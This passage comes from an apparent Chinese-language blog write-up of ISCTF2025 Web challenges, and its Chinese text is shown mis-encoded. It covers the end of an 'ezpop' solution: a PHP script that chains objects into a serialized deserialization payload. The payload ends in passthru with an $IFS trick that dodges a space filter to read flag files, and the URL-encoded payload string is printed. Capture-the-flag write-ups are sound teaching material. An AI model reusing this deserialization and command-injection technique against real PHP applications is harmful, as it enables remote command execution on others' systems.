<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passthru(&quot;uniq\$IFS\$9/f<span class="emphasis">*&quot;);    </span></span><br><span class="line"><span class="emphasis">//å¦‚æœå†™ca\tï¼Œé‚£\tä¼šè¢«phpè§£ææˆTabé”®ï¼›å¦‚æœåªå†™$IFS$9ï¼Œä¸¤ä¸ª$ä¼šè¢«phpè§£ææˆå˜é‡</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>è¿™æ ·å°±å¯ä»¥æ ¹æ®å·²çŸ¥çš„popé“¾ç¼–å†™è„šæœ¬äº†ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">begin</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$var1</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">anna</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$var6</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">starlord</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$var4</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flaag</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$var10</span>; <span class="keyword">public</span> <span class="variable">$var11</span> = <span class="number">213</span>; &#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eenndd</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$command</span> = <span class="string">&#x27;passthru(&quot;uniq\$IFS\$9/f*&quot;);&#x27;</span>; &#125;        <span class="comment">//ä¸è¦ç”¨åŒå¼•å·åµŒå¥—åŒå¼•å·</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">begin</span>();</span><br><span class="line"><span class="variable">$exp</span>-&gt;var1 = <span class="keyword">new</span> <span class="title function_ invoke__">anna</span>();</span><br><span class="line"><span class="variable">$exp</span>-&gt;var1-&gt;var6 = <span class="keyword">new</span> <span class="title function_ invoke__">starlord</span>();</span><br><span class="line"><span class="variable">$exp</span>-&gt;var1-&gt;var6-&gt;var4 = <span class="keyword">new</span> <span class="title function_ invoke__">flaag</span>();</span><br><span class="line"><span class="variable">$exp</span>-&gt;var1-&gt;var6-&gt;var4-&gt;var10 = <span class="keyword">new</span> <span class="title function_ invoke__">eenndd</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISCTF=O%3A5%3A%22begin%22%3A1%3A%7Bs%3A4%3A%22var1%22%3BO%3A4%3A%22anna%22%3A1%3A%7Bs%3A4%3A%22var6%22%3BO%3A8%3A%22starlord%22%3A1%3A%7Bs%3A4%3A%22var4%22%3BO%3A5%3A%22flaag%22%3A2%3A%7Bs%3A5%3A%22var10%22%3BO%3A6%3A%22eenndd%22%3A1%3A%7Bs%3A7%3A%22command%22%3Bs%3A28%3A%22passthru%28%22uniq%5C%24IFS%5C%249%2Ff%2A%22%29%3B%22%3B%7Ds%3A5%3A%22var11%22%3Bi%3A213%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="11-kaqiWeaponShop"><a href="#11-kaqiWeaponShop" class="headerlink" title="11. kaqiWeaponShop"></a>11. kaqiWeaponShop</h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="http://example.com">yanxi sishi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://example.com/2025/12/11/ISCTF2025%20wp/">http://example.com/2025/12/11/ISCTF2025%20wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº <a href="http://example.com" target="_blank">Welcome To yanxi Blog</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/ISCTF/">ISCTF</a><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post-share"><div class="social-share" data-image="/img/isctf/isctf2025.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/12/11/2.%20%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6(%E9%80%89%E6%8B%A9%E7%BB%93%E6%9E%84)/" title="2. æµç¨‹æ§åˆ¶(é€‰æ‹©ç»“æ„)"><img class="cover" src="/img/c/c2.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">ä¸‹ä¸€ç¯‡</div><div class="info-item-2">2. æµç¨‹æ§åˆ¶(é€‰æ‹©ç»“æ„)</div></div><div class="info-2"><div class="info-item-1">ç¬¬äºŒç« ï¼šæµç¨‹æ§åˆ¶ (é€‰æ‹©ç»“æ„) æœ¬ç« æ ¸å¿ƒï¼š è®©ç¨‹åºå­¦ä¼šâ€œæ€è€ƒâ€å’Œâ€œåšå†³å®šâ€ï¼ˆå¦‚æœâ€¦å°±â€¦ï¼Œå¦åˆ™â€¦ï¼‰ã€‚  1. å…³ç³»è¿ç®—ç¬¦ä¸é€»è¾‘è¿ç®—ç¬¦åˆ¤æ–­è¯­å¥åŸºäºå…³ç³»è¿ç®—ç¬¦ï¼ˆä¾‹å¦‚ &gt;ã€==ï¼‰çš„ç»“æœï¼ˆçœŸæˆ–å‡ï¼‰ã€‚ 1.1 å…³ç³»è¿ç®—ç¬¦== (ç­‰äº), != (ä¸ç­‰äº), &gt;, &lt;, &gt;=, &lt;=ã€‚ 1.2 é€»è¾‘è¿ç®—ç¬¦&amp;&amp; (ä¸), || (æˆ–), ! (é)ã€‚ è¡¥å……è€ƒç‚¹ï¼š  æ•°å­¦å†™æ³• vs C è¯­è¨€å†™æ³•ï¼š  æ•°å­¦é‡Œå†™ï¼š$0 &lt; x &lt; 10$  C è¯­è¨€å¿…é¡»å†™æˆï¼š(x &gt; 0) &amp;&amp; (x &lt; 10)    ä¼˜å…ˆçº§ï¼š  ! (æœ€é«˜) &gt; ç®—æœ¯è¿ç®—ç¬¦ &gt; å…³ç³»è¿ç®—ç¬¦ &gt; &amp;&amp; &gt; || (æœ€ä½)ã€‚     ä¹ é¢˜ 1 (å¯¹åº”ï¼šå…³ç³»ä¸é€»è¾‘è¿ç®—)é¢˜ç›®ï¼š ç¼–å†™ä»£ç åˆ¤æ–­è¾“å…¥çš„ä¸‰ä¸ªæ•´æ•° a, b, c èƒ½å¦æ„æˆä¸‰è§’å½¢ã€‚ æ„æˆä¸‰è§’å½¢çš„æ¡ä»¶ï¼š ä»»æ„ä¸¤è¾¹ä¹‹å’Œå¤§äºç¬¬ä¸‰è¾¹ã€‚ è¦æ±‚ï¼š ä½¿ç”¨é€»è¾‘ä¸è¿ç®—ç¬¦ &amp;&amp; è¿æ¥ä¸‰ä¸ªæ¡ä»¶ã€‚ é¢„æœŸè¾“å‡ºç»“æœï¼š 12è¯·è¾“å…¥ä¸‰è¾¹: 3 4 5å¯ä»¥æ„æˆä¸‰è§’å½¢  ç­”æ¡ˆï¼š...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">yanxi sishi</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yanxisishi"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-b-by-n0t1ce-b0ard"><span class="toc-text">1. \b@by n0t1ce b0ard</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E9%9A%BE%E8%BF%87%E7%9A%84bottle"><span class="toc-text">2. éš¾è¿‡çš„bottle</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-Bypass"><span class="toc-text">3. Bypass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-ezrce"><span class="toc-text">4. ezrce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-flag%E5%88%B0%E5%BA%95%E5%9C%A8%E5%93%AA"><span class="toc-text">5. flagåˆ°åº•åœ¨å“ª</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-%E6%9D%A5%E7%AD%BE%E4%B8%AA%E5%88%B0%E5%90%A7"><span class="toc-text">6. æ¥ç­¾ä¸ªåˆ°å§</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-flag%EF%BC%9F%E6%88%91%E5%B0%B1%E5%80%9F%E8%B5%B0%E4%BA%86"><span class="toc-text">7. flagï¼Ÿæˆ‘å°±å€Ÿèµ°äº†</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-Who-am-I"><span class="toc-text">8. Who am I</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9-mv-upload"><span class="toc-text">9. mv_upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-ezpop"><span class="toc-text">10. ezpop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-kaqiWeaponShop"><span class="toc-text">11. kaqiWeaponShop</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/12/11/ISCTF2025%20wp/" title="ISCTF2025 wp"><img src="/img/isctf/isctf2025.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ISCTF2025 wp"/></a><div class="content"><a class="title" href="/2025/12/11/ISCTF2025%20wp/" title="ISCTF2025 wp">ISCTF2025 wp</a><time datetime="2025-12-11T08:36:00.237Z" title="å‘è¡¨äº 2025-12-11 16:36:00">2025-12-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/11/2.%20%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6(%E9%80%89%E6%8B%A9%E7%BB%93%E6%9E%84)/" title="2. æµç¨‹æ§åˆ¶(é€‰æ‹©ç»“æ„)"><img src="/img/c/c2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2. æµç¨‹æ§åˆ¶(é€‰æ‹©ç»“æ„)"/></a><div class="content"><a class="title" href="/2025/12/11/2.%20%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6(%E9%80%89%E6%8B%A9%E7%BB%93%E6%9E%84)/" title="2. æµç¨‹æ§åˆ¶(é€‰æ‹©ç»“æ„)">2. æµç¨‹æ§åˆ¶(é€‰æ‹©ç»“æ„)</a><time datetime="2025-12-11T08:30:00.000Z" title="å‘è¡¨äº 2025-12-11 16:30:00">2025-12-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/10/1.%20C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E4%B8%8E%E6%95%B0%E6%8D%AE/" title="1. Cè¯­è¨€åŸºç¡€ä¸æ•°æ®"><img src="/img/c/c1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="1. Cè¯­è¨€åŸºç¡€ä¸æ•°æ®"/></a><div class="content"><a class="title" href="/2025/12/10/1.%20C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E4%B8%8E%E6%95%B0%E6%8D%AE/" title="1. Cè¯­è¨€åŸºç¡€ä¸æ•°æ®">1. Cè¯­è¨€åŸºç¡€ä¸æ•°æ®</a><time datetime="2025-12-10T08:00:00.000Z" title="å‘è¡¨äº 2025-12-10 16:00:00">2025-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/09/Hexo%E5%8D%9A%E5%AE%A2%E7%BB%B4%E6%8A%A4%E6%8C%87%E5%8D%97/" title="Hexoå‘½ä»¤ä¸é…ç½®å¤‡å¿˜å½•">Hexoå‘½ä»¤ä¸é…ç½®å¤‡å¿˜å½•</a><time datetime="2025-12-09T10:00:00.000Z" title="å‘è¡¨äº 2025-12-09 18:00:00">2025-12-09</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By yanxi sishi</span><span class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="ç®€ç¹è½¬æ¢">ç¹</button><button id="darkmode" type="button" title="æ—¥é—´å’Œå¤œé—´æ¨¡å¼åˆ‡æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="/js/tw_cn.js?v=5.5.2"></script><div class="js-pjax"></div><script>document.getElementById("site-name").textContent = "yanxi Blog";</script><div class="aplayer no-destroy" data-id="7452421336" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-autoplay="false" muted></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">æœç´¢</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  æ•°æ®åŠ è½½ä¸­</span></div><div class="local-search-input"><input placeholder="æœç´¢æ–‡ç« " type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.2"></script></div></div></body></html>